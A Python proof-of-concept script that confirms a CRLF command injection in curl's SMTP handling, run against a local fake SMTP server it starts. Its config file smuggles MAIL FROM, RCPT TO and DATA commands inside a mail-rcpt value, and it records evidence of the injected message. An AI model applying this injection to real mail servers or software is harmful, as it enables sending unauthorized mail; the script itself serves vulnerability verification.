import argparse
import json
import os
import pathlib
import shutil
import socket
import subprocess
import threading
import time


MARKER = "curl-smtp-injection-marker-v1"


def as_bool(value):
    return "true" if value else "false"


def config_quote(value):
    return value.replace("\\", "\\\\").replace('"', '\\"').replace("\r", "\\r").replace("\n", "\\n")


class SmtpPeer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.ready = threading.Event()
        self.events = []
        self.thread = threading.Thread(target=self.run, daemon=True)
        self.awaiting_plain_auth = False
        self.in_data = False
        self.data_lines = []
        self.completed_messages = []

    def event(self, name, **fields):
        self.events.append({"ts": time.time(), "event": name, **fields})

    def start(self):
        self.thread.start()
        if not self.ready.wait(10):
            raise RuntimeError("SMTP peer did not start")

    def send_line(self, conn, line):
        try:
            conn.sendall((line + "\r\n").encode("ascii"))
            self.event("send", line=line)
        except OSError as error:
            self.event("send_error", line=line, error=repr(error))

    def recv_line(self, conn, buf):
        while b"\n" not in buf:
            try:
                chunk = conn.recv(4096)
            except OSError as error:
                self.event("recv_error", error=repr(error))
                return None, buf
            if chunk == b"":
                return None, buf
            self.event("recv_raw", hex=chunk.hex(), text=chunk.decode("utf-8", "replace"))
            buf += chunk
        line, rest = buf.split(b"\n", 1)
        return line.rstrip(b"\r").decode("utf-8", "replace"), rest

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((self.host, self.port))
            srv.listen(1)
            self.port = srv.getsockname()[1]
            self.event("listening", host=self.host, port=self.port)
            self.ready.set()
            conn, peer = srv.accept()
            with conn:
                conn.settimeout(10)
                self.event("accepted", peer=str(peer))
                self.handle(conn)

    def handle(self, conn):
        self.send_line(conn, "220 smtp-peer ESMTP")
        buf = b""
        while True:
            line, buf = self.recv_line(conn, buf)
            if line is None:
                self.event("eof")
                return
            self.event("command", line=line)
            if self.in_data:
                if line == ".":
                    body = "\n".join(self.data_lines)
                    self.completed_messages.append(body)
                    self.event("message_completed", body=body)
                    self.data_lines = []
                    self.in_data = False
                    self.send_line(conn, "250 2.0.0 queued")
                else:
                    self.data_lines.append(line)
                continue
            upper = line.upper()
            if upper.startswith("EHLO") or upper.startswith("HELO"):
                self.send_line(conn, "250-localhost")
                self.send_line(conn, "250-AUTH PLAIN")
                self.send_line(conn, "250 HELP")
            elif upper == "AUTH PLAIN":
                self.awaiting_plain_auth = True
                self.send_line(conn, "334 ")
            elif upper.startswith("AUTH PLAIN "):
                self.send_line(conn, "235 2.7.0 authenticated")
            elif self.awaiting_plain_auth:
                self.awaiting_plain_auth = False
                self.send_line(conn, "235 2.7.0 authenticated")
            elif upper.startswith("EXPN"):
                self.send_line(conn, "250 expanded")
            elif upper.startswith("VRFY"):
                self.send_line(conn, "250 verified")
            elif upper.startswith("MAIL FROM:"):
                self.send_line(conn, "250 2.1.0 sender ok")
            elif upper.startswith("RCPT TO:"):
                self.send_line(conn, "250 2.1.5 recipient ok")
            elif upper == "DATA":
                self.in_data = True
                self.data_lines = []
                self.send_line(conn, "354 end with dot")
            elif upper.startswith("QUIT"):
                self.send_line(conn, "221 bye")
                return
            else:
                self.send_line(conn, "250 ok")


def write_config(path, host, port, mode):
    payload = (
        "Friends\r\n"
        "MAIL FROM:<probe-sender@example.com>\r\n"
        "RCPT TO:<probe-recipient@example.com>\r\n"
        "DATA\r\n"
        "Subject: injected\r\n"
        "\r\n"
        f"{MARKER}\r\n"
        "."
    )
    text = "\n".join(
        [
            f'url = "smtp://{host}:{port}/probe"',
            f'request = "{mode.upper()}"',
            f'mail-rcpt = "{config_quote(payload)}"',
            'user = "alice:secret"',
            'login-options = "AUTH=PLAIN"',
            "verbose",
            'max-time = "10"',
            "",
        ]
    )
    path.write_text(text, encoding="utf-8")


def command_lines(events):
    return [item["line"] for item in events if item.get("event") == "command"]


def first_contains(lines, prefix):
    prefix = prefix.upper()
    return any(line.upper().startswith(prefix) for line in lines)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--curl", default="curl")
    parser.add_argument("--work-dir", default=str(pathlib.Path(__file__).resolve().parent / "run" / "stock-curl-smtp-expn"))
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=0)
    parser.add_argument("--mode", choices=["expn", "vrfy"], default="expn")
    args = parser.parse_args()

    curl = shutil.which(args.curl) or args.curl
    work = pathlib.Path(args.work_dir).resolve()
    logs = work / "logs"
    logs.mkdir(parents=True, exist_ok=True)
    config = work / "smtp-crlf-injection.curlrc"
    marker_file = work / "VULNERABILITY_CONFIRMED.marker"
    evidence_file = logs / "evidence.json"

    peer = SmtpPeer(args.host, args.port)
    peer.start()
    write_config(config, args.host, peer.port, args.mode)

    env = os.environ.copy()
    env["NO_PROXY"] = "*"
    env["no_proxy"] = "*"
    version = subprocess.run([curl, "--version"], text=True, capture_output=True, check=False)
    proc = subprocess.run([curl, "-K", str(config)], text=True, capture_output=True, check=False, timeout=20, env=env)
    peer.thread.join(timeout=2)

    commands = command_lines(peer.events)
    message_body = peer.completed_messages[0] if peer.completed_messages else ""
    custom_request = args.mode.upper()
    checks = {
        "curl_exit_zero": proc.returncode == 0,
        "auth_seen": first_contains(commands, "AUTH PLAIN"),
        "custom_request_seen": first_contains(commands, custom_request),
        "injected_mail_seen": first_contains(commands, "MAIL FROM:<probe-sender@example.com>"),
        "injected_rcpt_seen": first_contains(commands, "RCPT TO:<probe-recipient@example.com>"),
        "injected_data_seen": any(line.upper() == "DATA" for line in commands),
        "message_completed": bool(peer.completed_messages),
        "marker_in_message": MARKER in message_body,
    }
    confirmed = all(checks.values())
    evidence = {
        "curl": curl,
        "curlVersion": version.stdout.splitlines()[0] if version.stdout else "",
        "config": str(config),
        "configText": config.read_text(encoding="utf-8"),
        "returnCode": proc.returncode,
        "stdout": proc.stdout,
        "stderr": proc.stderr,
        "commands": commands,
        "messageBody": message_body,
        "checks": checks,
        "confirmed": confirmed,
        "events": peer.events,
    }
    evidence_file.write_text(json.dumps(evidence, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    if confirmed:
        marker_file.write_text(
            "\n".join(
                [
                    "confirmed=true",
                    f"curl_version={evidence['curlVersion']}",
                    f"mode={args.mode}",
                    "command_injected=true",
                    "message_completed=true",
                    "recipient=<probe-recipient@example.com>",
                    f"marker={MARKER}",
                    "",
                ]
            ),
            encoding="utf-8",
        )

    print(f"curl_version={evidence['curlVersion']}")
    print(f"curl_exit={proc.returncode}")
    for name, value in checks.items():
        print(f"{name}={as_bool(value)}")
    print(f"confirmed={as_bool(confirmed)}")
    print(f"marker_file={marker_file if confirmed else ''}")
    print(f"evidence_json={evidence_file}")
    print(f"work_dir={work}")
    return 0 if confirmed else 1


if __name__ == "__main__":
    raise SystemExit(main())
